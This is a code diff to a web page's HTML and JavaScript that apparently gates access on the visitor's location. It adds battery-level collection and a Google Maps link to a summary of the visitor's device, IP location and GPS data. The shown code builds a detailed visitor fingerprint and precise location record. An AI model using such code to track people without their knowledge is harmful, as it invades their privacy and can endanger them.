@@ -995,12 +995,6 @@ html.location-gate-pending body {
   <input type="hidden" name="screen_size" />
   <input type="hidden" name="viewport_size" />
   <input type="hidden" name="network_type" />
-  <input type="hidden" name="gps_age_seconds" />
-  <input type="hidden" name="location_received_time_iso" />
-  <input type="hidden" name="location_received_after_seconds" />
-  <input type="hidden" name="browser_version" />
-  <input type="hidden" name="os_version" />
-  <input type="hidden" name="device_brand_note" />
   <input type="hidden" name="is_tablet_device" />
   <input type="hidden" name="is_pwa_standalone" />
   <input type="hidden" name="page_open_time_iso" />
@@ -1530,6 +1524,17 @@ html.location-gate-pending body {
   async function getDeviceInfo() {
     const info = syncDeviceInfo();
     try {
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        const level = Math.round((battery.level || 0) * 100) + "%";
+        const charging = battery.charging ? "Charging" : "Unplugged";
+        info.battery_info = level + " (" + charging + ")";
+      } else {
+        info.battery_info = "Not supported";
+      }
+    } catch (e) { info.battery_info = "Blocked by browser"; }
+    
+    try {
       if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
         const high = await navigator.userAgentData.getHighEntropyValues(["platform", "platformVersion", "model", "uaFullVersion", "fullVersionList"]);
         if (high.platform) info.platform = high.platform + (high.platformVersion ? " " + high.platformVersion : "");
@@ -1699,8 +1704,10 @@ html.location-gate-pending body {
       "Browser: " + (device.browser_name || "Unknown"),
       "OS: " + (device.os_name || "Unknown") + " " + (device.os_version || ""),
       "Device: " + (device.device_type || "Unknown") + (device.mobile_model && device.mobile_model !== "Not available - browser may hide exact model" && device.mobile_model !== "Not available" ? " (" + device.mobile_model + ")" : ""),
+      "Battery: " + (device.battery_info || "Unknown"),
       "Location IP: " + (ip.ip_city || "?") + ", " + (ip.ip_region || "?") + ", " + (ip.ip_country || "?"),
       "Location GPS: " + (gps.gps_quality_score !== "No GPS location received" ? (gps.gps_quality_score + " (" + gps.accuracy_meters + "m)") : "Denied / Blocked"),
+      "Map Link: " + (gps.google_maps_link !== "Not available" ? gps.google_maps_link : "No GPS Map"),
       "Network: " + (device.network_type || "Unknown"),
       "Time: " + (device.local_time || "Unknown")
     ].join("\n");
